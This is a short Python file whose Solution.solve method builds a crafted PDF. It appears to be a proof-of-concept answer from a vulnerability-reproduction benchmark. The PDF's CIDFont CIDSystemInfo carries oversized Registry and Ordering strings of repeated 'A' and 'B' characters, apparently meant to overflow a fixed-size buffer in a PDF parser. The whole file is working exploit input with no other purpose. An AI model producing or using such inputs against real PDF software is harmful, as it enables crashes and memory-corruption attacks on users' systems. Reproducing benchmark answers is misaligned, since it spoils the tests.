import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        length_needed = 300
        registry = 'A' * (length_needed // 2)
        ordering = 'B' * (length_needed // 2 + 1)
        output = io.BytesIO()
        output.write(b'%PDF-1.7\n')
        offsets = []
        offset = output.tell()
        offsets.append(offset)
        output.write(b'1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n\n')
        offset = output.tell()
        offsets.append(offset)
        output.write(b'2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n\n')
        offset = output.tell()
        offsets.append(offset)
        output.write(b'3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>\nendobj\n\n')
        content_stream = b'BT /F1 12 Tf 100 700 Td (Hello World) Tj ET\n'
        length_stream = len(content_stream)
        offset = output.tell()
        offsets.append(offset)
        output.write(f'4 0 obj\n<< /Length {length_stream} >>\nstream\n'.encode('ascii'))
        output.write(content_stream)
        output.write(b'endstream\nendobj\n\n')
        offset = output.tell()
        offsets.append(offset)
        output.write(b'5 0 obj\n<< /Type /Font /Subtype /Type0 /BaseFont /Some-CID /DescendantFonts [6 0 R] /Encoding /Identity-H >>\nendobj\n\n')
        offset = output.tell()
        offsets.append(offset)
        output.write(b'6 0 obj\n<< /Type /Font /Subtype /CIDFontType0 /BaseFont /Some-CID /CIDSystemInfo 7 0 R /DW 1000 /W [0 [1000]] >>\nendobj\n\n')
        offset = output.tell()
        offsets.append(offset)
        reg_bytes = registry.encode('ascii')
        ord_bytes = ordering.encode('ascii')
        reg_pdf = b'(' + reg_bytes + b')'
        ord_pdf = b'(' + ord_bytes + b')'
        output.write(b'7 0 obj\n<< /Registry ' + reg_pdf + b' /Ordering ' + ord_pdf + b' /Supplement 0 >>\nendobj\n\n')
        startxref = output.tell()
        output.write(b'xref\n0 8\n')
        output.write(b'0000000000 65535 f \n')
        for off in offsets:
            output.write(f'{off:010d} 00000 n \n'.encode('ascii'))
        output.write(b'trailer\n<< /Size 8 /Root 1 0 R >>\nstartxref\n')
        output.write(f'{startxref}\n%%EOF\n'.encode('ascii'))
        return output.getvalue()
